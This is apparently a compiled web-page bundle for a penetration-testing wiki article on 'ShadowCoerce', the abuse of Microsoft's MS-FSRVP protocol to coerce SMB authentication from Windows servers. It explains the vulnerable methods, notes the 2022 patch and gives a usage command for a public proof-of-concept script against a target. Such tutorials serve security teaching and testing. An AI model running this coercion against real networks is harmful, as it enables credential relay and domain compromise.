import{_ as t,c as a,a5 as o,o as s}from"./chunks/framework.B5CpDqM0.js";const r="/assets/File%20Server%20VSS%20Agent%20Service.Cbd2ofwT.png",i="/assets/MS%20FSRVP%20abuse%20example.CU39uu63.png",f=JSON.parse('{"title":"MS-FSRVP abuse (ShadowCoerce)","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/ms-fsrvp.md","filePath":"ad/movement/mitm-and-coerced-authentications/ms-fsrvp.md","lastUpdated":1724982529000}'),n={name:"ad/movement/mitm-and-coerced-authentications/ms-fsrvp.md"};function c(p,e,d,h,l,m){return s(),a("div",null,e[0]||(e[0]=[o('<h1 id="ms-fsrvp-abuse-shadowcoerce" tabindex="-1">MS-FSRVP abuse (ShadowCoerce) <a class="header-anchor" href="#ms-fsrvp-abuse-shadowcoerce" aria-label="Permalink to &quot;MS-FSRVP abuse (ShadowCoerce)&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>MS-FSRVP is Microsoft&#39;s File Server Remote VSS Protocol. It&#39;s used for creating shadow copies of file shares on a remote computer, and for facilitating backup applications in performing application-consistent backup and restore of data on SMB2 shares (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b" target="_blank" rel="noreferrer">docs.microsoft.com</a>). That interface is available through the <code>\\pipe\\FssagentRpc</code> SMB named pipe.</p><p>In late 2021, <a href="https://twitter.com/topotam77" target="_blank" rel="noreferrer">Lionel GILLES</a> published <a href="https://twitter.com/topotam77/status/1475701014204461056" target="_blank" rel="noreferrer">slides</a> showcasing <a href="./ms-efsr">PetitPotam</a> and demonstrating the possibility of abusing the protocol to coerce authentications on the last two slides.</p><p>Similarly to other MS-RPC abuses, this works by using a specific method relying on remote UNC paths. In this case, at the time of writing, two methods were detected as vulnerable: <code>IsPathSupported</code> and <code>IsPathShadowCopied</code>.</p><p>The coerced authentications are made over SMB. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with <a href="./webclient">WebClient abuse</a> to elicit incoming authentications made over HTTP.</p><p>A requirement to the abuse is to have the &quot;File Server VSS Agent Service&quot; enabled on the target server.</p><p><img src="'+r+'" alt=""></p><div class="tip custom-block"><p>In June 2022, Microsoft patched <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30154" target="_blank" rel="noreferrer">CVE-2022-30154</a> in <a href="https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b" target="_blank" rel="noreferrer">KB5014692</a>, which also patched this coercion attack.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>The following Python proof-of-concept (<a href="https://github.com/ShutdownRepo/ShadowCoerce" target="_blank" rel="noreferrer">https://github.com/ShutdownRepo/ShadowCoerce</a>) implements the <code>IsPathSupported</code> and <code>IsPathShadowCopied</code> methods.</p><div class="note custom-block"><p>For the proof of concept to work, using a proper security provider (<code>RPC_C_AUTHN_WINNT</code>) and authentication level (<code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code>) can required. It is enabled by default in the script.</p></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">shadowcoerce.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;domain&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;user&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;password&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LISTENER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TARGET</span></span></code></pre></div><p><img src="'+i+'" alt=""></p><div class="note custom-block"><p>In my tests, the coercion needed to be attempted twice in order to work when the FssAgent hadn&#39;t been requested in a while. In short, run the command again if it doesn&#39;t work the first time.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p>Topotam&#39;s tweet: <a href="https://twitter.com/topotam77/status/1475701014204461056" target="_blank" rel="noreferrer">https://twitter.com/topotam77/status/1475701014204461056</a></p><p>Topotam&#39;s slides: <a href="https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir" target="_blank" rel="noreferrer">https://fr.slideshare.net/LionelTopotam/petit-potam-slidesrtfmossir</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b" target="_blank" rel="noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b</a></p><p><a href="https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc" target="_blank" rel="noreferrer">https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc</a></p>',20)]))}const b=t(n,[["render",c]]);export{f as __pageData,b as default};
